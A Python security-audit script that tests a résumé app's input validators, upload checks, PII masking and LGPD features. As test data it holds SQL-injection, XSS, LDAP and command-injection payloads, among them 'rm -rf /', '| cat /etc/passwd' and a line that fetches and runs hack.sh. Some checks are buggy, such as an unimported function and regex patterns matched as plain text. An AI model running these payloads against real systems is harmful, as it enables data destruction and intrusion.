#!/usr/bin/env python3
"""
Comprehensive Penetration Testing Script for CV-Match Security Audit

This script performs comprehensive penetration testing of the CV-Match application
to verify all security implementations are working correctly.

Phase 0.7 Security Audit - Critical for Brazilian LGPD compliance
"""

import asyncio
import json
import logging
import re
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import subprocess
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class VulnerabilityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class Vulnerability:
    category: str
    level: VulnerabilityLevel
    description: str
    evidence: str
    recommendation: str
    endpoint: Optional[str] = None


class PenetrationTestResult:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.tests_passed = 0
        self.tests_failed = 0
        self.test_results: Dict[str, bool] = {}
        self.start_time = time.time()
        self.end_time = None

    def add_vulnerability(self, vuln: Vulnerability):
        self.vulnerabilities.append(vuln)
        logger.error(f"VULNERABILITY FOUND: {vuln.level.value.upper()} - {vuln.description}")
        logger.error(f"  Evidence: {vuln.evidence}")
        logger.error(f"  Recommendation: {vuln.recommendation}")

    def add_test_result(self, test_name: str, passed: bool, details: str = ""):
        self.test_results[test_name] = passed
        if passed:
            self.tests_passed += 1
            logger.info(f"✅ PASSED: {test_name} - {details}")
        else:
            self.tests_failed += 1
            logger.error(f"❌ FAILED: {test_name} - {details}")

    def generate_report(self) -> Dict[str, Any]:
        self.end_time = time.time()
        duration = self.end_time - self.start_time

        # Count vulnerabilities by severity
        severity_counts = {level.value: 0 for level in VulnerabilityLevel}
        for vuln in self.vulnerabilities:
            severity_counts[vuln.level.value] += 1

        return {
            "executive_summary": {
                "total_tests": len(self.test_results),
                "tests_passed": self.tests_passed,
                "tests_failed": self.tests_failed,
                "success_rate": (self.tests_passed / len(self.test_results)) * 100 if self.test_results else 0,
                "total_vulnerabilities": len(self.vulnerabilities),
                "duration_seconds": round(duration, 2),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            },
            "vulnerability_summary": {
                "critical": severity_counts["critical"],
                "high": severity_counts["high"],
                "medium": severity_counts["medium"],
                "low": severity_counts["low"]
            },
            "vulnerabilities": [
                {
                    "category": v.category,
                    "level": v.level.value,
                    "description": v.description,
                    "evidence": v.evidence,
                    "recommendation": v.recommendation,
                    "endpoint": v.endpoint
                }
                for v in self.vulnerabilities
            ],
            "test_results": self.test_results,
            "compliance_status": {
                "ready_for_production": severity_counts["critical"] == 0 and severity_counts["high"] == 0,
                "lgpd_compliant": not any(v.category == "LGPD" for v in self.vulnerabilities if v.level in [VulnerabilityLevel.HIGH, VulnerabilityLevel.CRITICAL])
            }
        }


class PenetrationTester:
    def __init__(self):
        self.result = PenetrationTestResult()
        self.api_base_url = "http://localhost:8000"
        self.test_user_token = None

    async def run_all_tests(self) -> PenetrationTestResult:
        """Run all penetration tests."""
        logger.info("🔍 Starting comprehensive penetration testing...")
        logger.info("=" * 60)

        # Test 1: Static Analysis
        await self.test_static_analysis()

        # Test 2: Input Validation Testing
        await self.test_input_validation()

        # Test 3: Authentication & Authorization Testing
        await self.test_authentication_authorization()

        # Test 4: Injection Attack Testing
        await self.test_injection_attacks()

        # Test 5: File Upload Security Testing
        await self.test_file_upload_security()

        # Test 6: Rate Limiting Testing
        await self.test_rate_limiting()

        # Test 7: Security Headers Testing
        await self.test_security_headers()

        # Test 8: PII Detection Testing
        await self.test_pii_detection()

        # Test 9: Bias Detection Testing
        await self.test_bias_detection()

        # Test 10: LGPD Compliance Testing
        await self.test_lgpd_compliance()

        # Test 11: Database Security Testing
        await self.test_database_security()

        logger.info("=" * 60)
        logger.info("🔍 Penetration testing completed!")

        return self.result

    async def test_static_analysis(self):
        """Test static code analysis for security vulnerabilities."""
        logger.info("🔍 Testing static analysis...")

        try:
            # Check for hardcoded secrets
            sensitive_files = [
                "/home/carlos/projects/cv-match/backend/app/main.py",
                "/home/carlos/projects/cv-match/backend/.env.example"
            ]

            secrets_found = []
            for file_path in sensitive_files:
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()

                        # Check for common secret patterns
                        secret_patterns = [
                            (r'password\s*=\s*["\'][^"\']+["\']', "Hardcoded password"),
                            (r'secret_key\s*=\s*["\'][^"\']+["\']', "Hardcoded secret key"),
                            (r'api_key\s*=\s*["\'][^"\']+["\']', "Hardcoded API key"),
                            (r'token\s*=\s*["\'][^"\']+["\']', "Hardcoded token")
                        ]

                        for pattern, description in secret_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                secrets_found.append(f"{file_path}: {description}")

            if secrets_found:
                self.result.add_vulnerability(Vulnerability(
                    category="Static Analysis",
                    level=VulnerabilityLevel.HIGH,
                    description="Hardcoded secrets found in source code",
                    evidence="; ".join(secrets_found),
                    recommendation="Remove hardcoded secrets and use environment variables"
                ))
                self.result.add_test_result("static_analysis_secrets", False, "Hardcoded secrets found")
            else:
                self.result.add_test_result("static_analysis_secrets", True, "No hardcoded secrets found")

            # Check for SQL injection patterns in code
            sql_injection_patterns = [
                r'execute\s*\(\s*["\'][^"\']*%s',
                r'execute\s*\(\s*["\'][^"\']*format',
                r'query\s*\(\s*["\'][^"\']*%s'
            ]

            unsafe_queries = []
            for root, dirs, files in os.walk("/home/carlos/projects/cv-match/backend/app"):
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for pattern in sql_injection_patterns:
                                if re.search(pattern, content, re.IGNORECASE):
                                    unsafe_queries.append(f"{file_path}: Potential SQL injection")

            if unsafe_queries:
                self.result.add_vulnerability(Vulnerability(
                    category="Static Analysis",
                    level=VulnerabilityLevel.CRITICAL,
                    description="Unsafe SQL query patterns found",
                    evidence="; ".join(unsafe_queries[:3]),
                    recommendation="Use parameterized queries or ORM to prevent SQL injection"
                ))
                self.result.add_test_result("static_analysis_sql", False, "Unsafe SQL patterns found")
            else:
                self.result.add_test_result("static_analysis_sql", True, "No unsafe SQL patterns found")

        except Exception as e:
            logger.error(f"Static analysis error: {e}")
            self.result.add_test_result("static_analysis", False, f"Error: {e}")

    async def test_input_validation(self):
        """Test input validation mechanisms."""
        logger.info("🔍 Testing input validation...")

        try:
            # Test the validation utilities directly
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.utils.validation import validate_string, validate_dict

            # Test SQL injection prevention
            sql_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM users --"
            ]

            sql_blocked = 0
            for payload in sql_payloads:
                result = validate_string(payload, input_type="general")
                if not result.is_valid:
                    sql_blocked += 1

            if sql_blocked == len(sql_payloads):
                self.result.add_test_result("input_validation_sql", True, f"All {len(sql_payloads)} SQL injection attempts blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Input Validation",
                    level=VulnerabilityLevel.HIGH,
                    description="SQL injection not properly blocked",
                    evidence=f"{len(sql_payloads) - sql_blocked} SQL payloads passed validation",
                    recommendation="Strengthen SQL injection detection patterns"
                ))
                self.result.add_test_result("input_validation_sql", False, f"Only {sql_blocked}/{len(sql_payloads)} SQL injections blocked")

            # Test XSS prevention
            xss_payloads = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "onload=alert('xss')"
            ]

            xss_blocked = 0
            for payload in xss_payloads:
                result = validate_string(payload, input_type="general")
                if not result.is_valid:
                    xss_blocked += 1

            if xss_blocked == len(xss_payloads):
                self.result.add_test_result("input_validation_xss", True, f"All {len(xss_payloads)} XSS attempts blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Input Validation",
                    level=VulnerabilityLevel.HIGH,
                    description="XSS not properly blocked",
                    evidence=f"{len(xss_payloads) - xss_blocked} XSS payloads passed validation",
                    recommendation="Strengthen XSS detection patterns"
                ))
                self.result.add_test_result("input_validation_xss", False, f"Only {xss_blocked}/{len(xss_payloads)} XSS attempts blocked")

            # Test command injection prevention
            cmd_payloads = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "$(curl malicious.com)",
                "`wget hack.sh && bash hack.sh`"
            ]

            cmd_blocked = 0
            for payload in cmd_payloads:
                result = validate_string(payload, input_type="general")
                if not result.is_valid:
                    cmd_blocked += 1

            if cmd_blocked == len(cmd_payloads):
                self.result.add_test_result("input_validation_cmd", True, f"All {len(cmd_payloads)} command injection attempts blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Input Validation",
                    level=VulnerabilityLevel.CRITICAL,
                    description="Command injection not properly blocked",
                    evidence=f"{len(cmd_payloads) - cmd_blocked} command payloads passed validation",
                    recommendation="Strengthen command injection detection patterns"
                ))
                self.result.add_test_result("input_validation_cmd", False, f"Only {cmd_blocked}/{len(cmd_payloads)} command injections blocked")

        except Exception as e:
            logger.error(f"Input validation test error: {e}")
            self.result.add_test_result("input_validation", False, f"Error: {e}")

    async def test_authentication_authorization(self):
        """Test authentication and authorization mechanisms."""
        logger.info("🔍 Testing authentication and authorization...")

        try:
            # Test authentication dependency exists and works
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.core.auth import get_current_user

            self.result.add_test_result("auth_dependency_exists", True, "Authentication dependency found")

            # Test that protected endpoints exist
            protected_endpoints = [
                "/api/resumes/upload",
                "/api/optimizations/start",
                "/api/users/profile"
            ]

            endpoints_found = 0
            for endpoint in protected_endpoints:
                # Check if endpoint exists by examining the routing files
                endpoint_files = [
                    "/home/carlos/projects/cv-match/backend/app/api/endpoints/resumes.py",
                    "/home/carlos/projects/cv-match/backend/app/api/endpoints/optimizations.py",
                    "/home/carlos/projects/cv-match/backend/app/api/endpoints/users.py"
                ]

                for file_path in endpoint_files:
                    if os.path.exists(file_path):
                        with open(file_path, 'r') as f:
                            content = f.read()
                            if "get_current_user" in content or "Depends" in content:
                                endpoints_found += 1
                                break

            if endpoints_found > 0:
                self.result.add_test_result("auth_protected_endpoints", True, f"{endpoints_found} protected endpoints found")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Authentication",
                    level=VulnerabilityLevel.HIGH,
                    description="No protected endpoints found",
                    evidence="Protected endpoints missing authentication decorators",
                    recommendation="Add authentication to all sensitive endpoints"
                ))
                self.result.add_test_result("auth_protected_endpoints", False, "No protected endpoints found")

            # Test user authorization implementation
            auth_service_file = "/home/carlos/projects/cv-match/backend/app/services/supabase/auth.py"
            if os.path.exists(auth_service_file):
                with open(auth_service_file, 'r') as f:
                    content = f.read()
                    if "SupabaseAuthService" in content and "get_user" in content:
                        self.result.add_test_result("auth_service_implemented", True, "SupabaseAuthService implemented")
                    else:
                        self.result.add_vulnerability(Vulnerability(
                            category="Authentication",
                            level=VulnerabilityLevel.HIGH,
                            description="Authentication service not properly implemented",
                            evidence="Missing SupabaseAuthService methods",
                            recommendation="Complete authentication service implementation"
                        ))
                        self.result.add_test_result("auth_service_implemented", False, "Authentication service incomplete")

        except Exception as e:
            logger.error(f"Authentication test error: {e}")
            self.result.add_test_result("authentication", False, f"Error: {e}")

    async def test_injection_attacks(self):
        """Test injection attack prevention."""
        logger.info("🔍 Testing injection attack prevention...")

        try:
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.utils.validation import validate_string

            # Test NoSQL injection patterns
            nosql_payloads = [
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$where": "this.username == 'admin'"}
            ]

            nosql_blocked = 0
            for payload in nosql_payloads:
                result = validate_dict(payload, max_items=5, max_value_length=100)
                if not result.is_valid:
                    nosql_blocked += 1

            if nosql_blocked >= len(nosql_payloads) * 0.8:  # 80% block rate
                self.result.add_test_result("injection_nosql", True, f"{nosql_blocked}/{len(nosql_payloads)} NoSQL injection attempts blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Injection Attacks",
                    level=VulnerabilityLevel.HIGH,
                    description="NoSQL injection not properly blocked",
                    evidence=f"Only {nosql_blocked}/{len(nosql_payloads)} NoSQL payloads blocked",
                    recommendation="Strengthen NoSQL injection detection patterns"
                ))
                self.result.add_test_result("injection_nosql", False, f"Only {nosql_blocked}/{len(nosql_payloads)} NoSQL injections blocked")

            # Test LDAP injection patterns
            ldap_payloads = [
                "*)(uid=*",
                "*)(&(uid=*",
                "*)|(uid=*",
                "*)%00"
            ]

            ldap_blocked = 0
            for payload in ldap_payloads:
                result = validate_string(payload, input_type="general")
                if not result.is_valid:
                    ldap_blocked += 1

            if ldap_blocked >= len(ldap_payloads) * 0.8:  # 80% block rate
                self.result.add_test_result("injection_ldap", True, f"{ldap_blocked}/{len(ldap_payloads)} LDAP injection attempts blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Injection Attacks",
                    level=VulnerabilityLevel.MEDIUM,
                    description="LDAP injection not properly blocked",
                    evidence=f"Only {ldap_blocked}/{len(ldap_payloads)} LDAP payloads blocked",
                    recommendation="Strengthen LDAP injection detection patterns"
                ))
                self.result.add_test_result("injection_ldap", False, f"Only {ldap_blocked}/{len(ldap_payloads)} LDAP injections blocked")

        except Exception as e:
            logger.error(f"Injection attack test error: {e}")
            self.result.add_test_result("injection_attacks", False, f"Error: {e}")

    async def test_file_upload_security(self):
        """Test file upload security."""
        logger.info("🔍 Testing file upload security...")

        try:
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.utils.file_security import validate_file_security

            # Test malicious file detection
            malicious_files = [
                (b"MZ\x90\x00\x03\x00\x00\x00\x04\x00", "malicious.exe", "application/octet-stream"),
                (b"#!/bin/bash\nrm -rf /", "malicious.sh", "application/x-sh"),
                (b"<script>alert('xss')</script>", "malicious.html", "text/html")
            ]

            malicious_blocked = 0
            for content, filename, content_type in malicious_files:
                try:
                    result = validate_file_security(content, filename, content_type)
                    if not result.is_safe:
                        malicious_blocked += 1
                except Exception:
                    # Exception is also a form of blocking
                    malicious_blocked += 1

            if malicious_blocked == len(malicious_files):
                self.result.add_test_result("file_security_malicious", True, f"All {len(malicious_files)} malicious files blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="File Upload Security",
                    level=VulnerabilityLevel.HIGH,
                    description="Malicious files not properly blocked",
                    evidence=f"Only {malicious_blocked}/{len(malicious_files)} malicious files blocked",
                    recommendation="Strengthen malicious file detection"
                ))
                self.result.add_test_result("file_security_malicious", False, f"Only {malicious_blocked}/{len(malicious_files)} malicious files blocked")

            # Test filename security
            malicious_filenames = [
                "../../../etc/passwd",
                "file\x00.exe",
                "con.pdf",
                "file<with>brackets.pdf"
            ]

            filename_blocked = 0
            for filename in malicious_filenames:
                try:
                    result = validate_file_security(b"safe content", filename, "application/pdf")
                    if not result.is_safe:
                        filename_blocked += 1
                except Exception:
                    filename_blocked += 1

            if filename_blocked >= len(malicious_filenames) * 0.8:  # 80% block rate
                self.result.add_test_result("file_security_filename", True, f"{filename_blocked}/{len(malicious_filenames)} malicious filenames blocked")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="File Upload Security",
                    level=VulnerabilityLevel.HIGH,
                    description="Malicious filenames not properly blocked",
                    evidence=f"Only {filename_blocked}/{len(malicious_filenames)} malicious filenames blocked",
                    recommendation="Strengthen filename validation"
                ))
                self.result.add_test_result("file_security_filename", False, f"Only {filename_blocked}/{len(malicious_filenames)} malicious filenames blocked")

        except Exception as e:
            logger.error(f"File upload security test error: {e}")
            self.result.add_test_result("file_upload_security", False, f"Error: {e}")

    async def test_rate_limiting(self):
        """Test rate limiting mechanisms."""
        logger.info("🔍 Testing rate limiting...")

        try:
            # Check if rate limiting middleware exists
            middleware_file = "/home/carlos/projects/cv-match/backend/app/middleware/security.py"
            if os.path.exists(middleware_file):
                with open(middleware_file, 'r') as f:
                    content = f.read()
                    if "rate_limit" in content.lower() and "SecurityMiddleware" in content:
                        self.result.add_test_result("rate_limiting_implemented", True, "Rate limiting middleware found")
                    else:
                        self.result.add_vulnerability(Vulnerability(
                            category="Rate Limiting",
                            level=VulnerabilityLevel.MEDIUM,
                            description="Rate limiting not implemented",
                            evidence="SecurityMiddleware missing rate limiting logic",
                            recommendation="Implement rate limiting to prevent DoS attacks"
                        ))
                        self.result.add_test_result("rate_limiting_implemented", False, "Rate limiting not found")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Rate Limiting",
                    level=VulnerabilityLevel.MEDIUM,
                    description="Security middleware not found",
                    evidence="Security middleware file missing",
                    recommendation="Implement security middleware with rate limiting"
                ))
                self.result.add_test_result("rate_limiting_implemented", False, "Security middleware not found")

        except Exception as e:
            logger.error(f"Rate limiting test error: {e}")
            self.result.add_test_result("rate_limiting", False, f"Error: {e}")

    async def test_security_headers(self):
        """Test security headers implementation."""
        logger.info("🔍 Testing security headers...")

        try:
            # Check if security headers are implemented in middleware
            middleware_file = "/home/carlos/projects/cv-match/backend/app/middleware/security.py"
            if os.path.exists(middleware_file):
                with open(middleware_file, 'r') as f:
                    content = f.read()

                    required_headers = [
                        "x-frame-options",
                        "x-content-type-options",
                        "x-xss-protection",
                        "content-security-policy",
                        "strict-transport-security"
                    ]

                    headers_found = 0
                    for header in required_headers:
                        if header in content.lower():
                            headers_found += 1

                    if headers_found >= len(required_headers) * 0.8:  # 80% implementation
                        self.result.add_test_result("security_headers", True, f"{headers_found}/{len(required_headers)} security headers implemented")
                    else:
                        self.result.add_vulnerability(Vulnerability(
                            category="Security Headers",
                            level=VulnerabilityLevel.MEDIUM,
                            description="Security headers not fully implemented",
                            evidence=f"Only {headers_found}/{len(required_headers)} security headers found",
                            recommendation="Implement all required security headers"
                        ))
                        self.result.add_test_result("security_headers", False, f"Only {headers_found}/{len(required_headers)} security headers found")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Security Headers",
                    level=VulnerabilityLevel.MEDIUM,
                    description="Security middleware not found for headers",
                    evidence="Security middleware file missing",
                    recommendation="Implement security middleware with proper headers"
                ))
                self.result.add_test_result("security_headers", False, "Security middleware not found")

        except Exception as e:
            logger.error(f"Security headers test error: {e}")
            self.result.add_test_result("security_headers", False, f"Error: {e}")

    async def test_pii_detection(self):
        """Test PII detection and masking."""
        logger.info("🔍 Testing PII detection...")

        try:
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.services.security.pii_detection_service import scan_for_pii, mask_pii

            # Test Brazilian PII detection
            test_cases = [
                ("Meu CPF é 123.456.789-01", ["cpf"]),
                ("Telefone: (11) 98765-4321", ["phone"]),
                ("Email: joao.silva@empresa.com.br", ["email"]),
                ("CEP: 01310-100", ["postal_code"]),
                ("RG: 12.345.678-9", ["rg"])
            ]

            pii_detected = 0
            for text, expected_types in test_cases:
                result = scan_for_pii(text)
                if result.has_pii:
                    detected_types = [pii_type.value for pii_type in result.pii_types_found]
                    if any(expected in detected_types for expected in expected_types):
                        pii_detected += 1

            if pii_detected == len(test_cases):
                self.result.add_test_result("pii_detection", True, f"All {len(test_cases)} PII types detected")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="PII Detection",
                    level=VulnerabilityLevel.HIGH,
                    description="PII detection not working correctly",
                    evidence=f"Only {pii_detected}/{len(test_cases)} PII types detected",
                    recommendation="Improve PII detection patterns for Brazilian data"
                ))
                self.result.add_test_result("pii_detection", False, f"Only {pii_detected}/{len(test_cases)} PII types detected")

            # Test PII masking
            test_text = "Contato: João Silva - CPF: 123.456.789-01 - Tel: (11) 98765-4321"
            masked_text = mask_pii(test_text)

            if masked_text != test_text:  # Text should be masked
                self.result.add_test_result("pii_masking", True, "PII masking working correctly")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="PII Detection",
                    level=VulnerabilityLevel.HIGH,
                    description="PII masking not working",
                    evidence="PII not masked in test text",
                    recommendation="Fix PII masking implementation"
                ))
                self.result.add_test_result("pii_masking", False, "PII masking not working")

        except Exception as e:
            logger.error(f"PII detection test error: {e}")
            self.result.add_test_result("pii_detection", False, f"Error: {e}")

    async def test_bias_detection(self):
        """Test bias detection and anti-discrimination."""
        logger.info("🔍 Testing bias detection...")

        try:
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.services.bias_detection_service import bias_detection_service

            # Test protected characteristics detection
            test_texts = [
                "Nome: João Silva, 25 anos, masculino, solteiro",
                "Candidato negro, 30 anos, formado em escola pública",
                "Pessoa com deficiência (PCD), 35 anos, casada"
            ]

            characteristics_detected = 0
            for text in test_texts:
                result = bias_detection_service.analyze_text_bias(text, context="resume")
                if result.detected_characteristics:
                    characteristics_detected += 1

            if characteristics_detected >= len(test_texts) * 0.8:  # 80% detection rate
                self.result.add_test_result("bias_detection", True, f"Protected characteristics detected in {characteristics_detected}/{len(test_texts)} test cases")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Bias Detection",
                    level=VulnerabilityLevel.HIGH,
                    description="Bias detection not working correctly",
                    evidence=f"Only {characteristics_detected}/{len(test_texts)} test cases detected bias",
                    recommendation="Improve bias detection patterns for Brazilian context"
                ))
                self.result.add_test_result("bias_detection", False, f"Only {characteristics_detected}/{len(test_cases)} test cases detected bias")

            # Test anti-discrimination prompt generation
            anti_discrimination_prompt = bias_detection_service.create_anti_discrimination_prompt("scoring")
            required_keywords = ["NÃO CONSIDERAR", "idade", "gênero", "raça", "LGPD"]

            keywords_found = sum(1 for keyword in required_keywords if keyword in anti_discrimination_prompt)
            if keywords_found >= len(required_keywords) * 0.8:  # 80% keyword presence
                self.result.add_test_result("anti_discrimination_prompt", True, f"Anti-discrimination prompt contains {keywords_found}/{len(required_keywords)} required elements")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Bias Detection",
                    level=VulnerabilityLevel.MEDIUM,
                    description="Anti-discrimination prompt incomplete",
                    evidence=f"Only {keywords_found}/{len(required_keywords)} required keywords found",
                    recommendation="Complete anti-discrimination prompt implementation"
                ))
                self.result.add_test_result("anti_discrimination_prompt", False, f"Anti-discrimination prompt incomplete")

        except Exception as e:
            logger.error(f"Bias detection test error: {e}")
            self.result.add_test_result("bias_detection", False, f"Error: {e}")

    async def test_lgpd_compliance(self):
        """Test LGPD compliance features."""
        logger.info("🔍 Testing LGPD compliance...")

        try:
            sys.path.insert(0, '/home/carlos/projects/cv-match/backend')
            from app.services.security.consent_manager import ConsentManager
            from app.services.security.data_subject_rights import DataSubjectRightsService
            from app.services.security.retention_manager import RetentionManager

            # Test consent manager
            try:
                consent_manager = ConsentManager()
                self.result.add_test_result("lgpd_consent_manager", True, "ConsentManager implemented")
            except Exception:
                self.result.add_vulnerability(Vulnerability(
                    category="LGPD Compliance",
                    level=VulnerabilityLevel.HIGH,
                    description="LGPD Consent Manager not implemented",
                    evidence="ConsentManager initialization failed",
                    recommendation="Complete LGPD consent management implementation"
                ))
                self.result.add_test_result("lgpd_consent_manager", False, "ConsentManager not implemented")

            # Test data subject rights
            try:
                data_rights_service = DataSubjectRightsService()
                self.result.add_test_result("lgpd_data_subject_rights", True, "DataSubjectRightsService implemented")
            except Exception:
                self.result.add_vulnerability(Vulnerability(
                    category="LGPD Compliance",
                    level=VulnerabilityLevel.HIGH,
                    description="LGPD Data Subject Rights not implemented",
                    evidence="DataSubjectRightsService initialization failed",
                    recommendation="Complete LGPD data subject rights implementation"
                ))
                self.result.add_test_result("lgpd_data_subject_rights", False, "DataSubjectRightsService not implemented")

            # Test retention manager
            try:
                retention_manager = RetentionManager()
                self.result.add_test_result("lgpd_retention_manager", True, "RetentionManager implemented")
            except Exception:
                self.result.add_vulnerability(Vulnerability(
                    category="LGPD Compliance",
                    level=VulnerabilityLevel.MEDIUM,
                    description="LGPD Retention Manager not implemented",
                    evidence="RetentionManager initialization failed",
                    recommendation="Complete LGPD data retention implementation"
                ))
                self.result.add_test_result("lgpd_retention_manager", False, "RetentionManager not implemented")

            # Check LGPD database tables
            lgpd_tables = [
                "consent_types",
                "user_consents",
                "consent_history",
                "data_processing_activities",
                "user_data_processing"
            ]

            # Check migration file
            migration_file = "/home/carlos/projects/cv-match/supabase/migrations/20251013000000_create_lgpd_consent_system.sql"
            if os.path.exists(migration_file):
                with open(migration_file, 'r') as f:
                    content = f.read()
                    tables_found = sum(1 for table in lgpd_tables if f"CREATE TABLE.*{table}" in content)

                    if tables_found >= len(lgpd_tables) * 0.8:  # 80% of tables found
                        self.result.add_test_result("lgpd_database_tables", True, f"{tables_found}/{len(lgpd_tables)} LGPD tables in migration")
                    else:
                        self.result.add_vulnerability(Vulnerability(
                            category="LGPD Compliance",
                            level=VulnerabilityLevel.HIGH,
                            description="LGPD database tables missing",
                            evidence=f"Only {tables_found}/{len(lgpd_tables)} LGPD tables found in migration",
                            recommendation="Complete LGPD database schema implementation"
                        ))
                        self.result.add_test_result("lgpd_database_tables", False, f"Only {tables_found}/{len(lgpd_tables)} LGPD tables found")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="LGPD Compliance",
                    level=VulnerabilityLevel.CRITICAL,
                    description="LGPD database migration not found",
                    evidence="LGPD migration file missing",
                    recommendation="Create LGPD database migration with all required tables"
                ))
                self.result.add_test_result("lgpd_database_tables", False, "LGPD migration not found")

        except Exception as e:
            logger.error(f"LGPD compliance test error: {e}")
            self.result.add_test_result("lgpd_compliance", False, f"Error: {e}")

    async def test_database_security(self):
        """Test database security (RLS policies)."""
        logger.info("🔍 Testing database security...")

        try:
            # Check RLS policies in migration files
            migrations_path = "/home/carlos/projects/cv-match/supabase/migrations"
            rls_policies_found = 0

            for root, dirs, files in os.walk(migrations_path):
                for file in files:
                    if file.endswith('.sql'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r') as f:
                            content = f.read()
                            if "ROW LEVEL SECURITY" in content and "CREATE POLICY" in content:
                                rls_policies_found += 1

            if rls_policies_found > 0:
                self.result.add_test_result("database_rls_policies", True, f"Found {rls_policies_found} RLS policies in migrations")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Database Security",
                    level=VulnerabilityLevel.CRITICAL,
                    description="No RLS policies found in database",
                    evidence="No ROW LEVEL SECURITY policies in migration files",
                    recommendation="Implement RLS policies for all user-scoped tables"
                ))
                self.result.add_test_result("database_rls_policies", False, "No RLS policies found")

            # Check user ownership patterns in tables
            user_scoped_tables = ["resumes", "optimizations", "payments", "user_consents"]
            tables_with_user_id = 0

            for root, dirs, files in os.walk(migrations_path):
                for file in files:
                    if file.endswith('.sql'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r') as f:
                            content = f.read()
                            for table in user_scoped_tables:
                                if f"CREATE TABLE.*{table}" in content and "user_id" in content:
                                    tables_with_user_id += 1

            if tables_with_user_id >= len(user_scoped_tables) * 0.8:  # 80% of tables have user_id
                self.result.add_test_result("database_user_ownership", True, f"{tables_with_user_id}/{len(user_scoped_tables)} tables have user_id column")
            else:
                self.result.add_vulnerability(Vulnerability(
                    category="Database Security",
                    level=VulnerabilityLevel.HIGH,
                    description="Missing user ownership in database tables",
                    evidence=f"Only {tables_with_user_id}/{len(user_scoped_tables)} tables have user_id column",
                    recommendation="Add user_id column to all user-scoped tables"
                ))
                self.result.add_test_result("database_user_ownership", False, f"Only {tables_with_user_id}/{len(user_scoped_tables)} tables have user_id")

        except Exception as e:
            logger.error(f"Database security test error: {e}")
            self.result.add_test_result("database_security", False, f"Error: {e}")


async def main():
    """Main function to run penetration tests."""
    logger.info("🚀 Starting CV-Match Phase 0.7 Security Penetration Testing")
    logger.info("🔒 Critical for Brazilian LGPD compliance")
    logger.info("=" * 60)

    tester = PenetrationTester()
    result = await tester.run_all_tests()

    # Generate report
    report = result.generate_report()

    # Save report
    report_path = "/home/carlos/projects/cv-match/security-reports/penetration_test_report.json"
    os.makedirs(os.path.dirname(report_path), exist_ok=True)

    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)

    logger.info("=" * 60)
    logger.info("📊 PENETRATION TEST SUMMARY")
    logger.info("=" * 60)
    logger.info(f"Total Tests: {report['executive_summary']['total_tests']}")
    logger.info(f"Tests Passed: {report['executive_summary']['tests_passed']}")
    logger.info(f"Tests Failed: {report['executive_summary']['tests_failed']}")
    logger.info(f"Success Rate: {report['executive_summary']['success_rate']:.1f}%")
    logger.info(f"Total Vulnerabilities: {report['executive_summary']['total_vulnerabilities']}")
    logger.info(f"Duration: {report['executive_summary']['duration_seconds']} seconds")

    logger.info("\n🚨 VULNERABILITY BREAKDOWN:")
    for level, count in report['vulnerability_summary'].items():
        if count > 0:
            logger.info(f"  {level.upper()}: {count}")

    logger.info(f"\n✅ COMPLIANCE STATUS:")
    logger.info(f"  Ready for Production: {report['compliance_status']['ready_for_production']}")
    logger.info(f"  LGPD Compliant: {report['compliance_status']['lgpd_compliant']}")

    logger.info(f"\n📄 Full report saved to: {report_path}")

    # Exit with appropriate code
    critical_vulns = report['vulnerability_summary']['critical']
    high_vulns = report['vulnerability_summary']['high']

    if critical_vulns > 0:
        logger.error(f"\n❌ CRITICAL: {critical_vulns} critical vulnerabilities found. System not ready for production.")
        sys.exit(2)
    elif high_vulns > 0:
        logger.error(f"\n⚠️  WARNING: {high_vulns} high vulnerabilities found. Address before production.")
        sys.exit(1)
    else:
        logger.info(f"\n✅ SUCCESS: No critical or high vulnerabilities found. System ready for production deployment.")
        sys.exit(0)


if __name__ == "__main__":
    asyncio.run(main())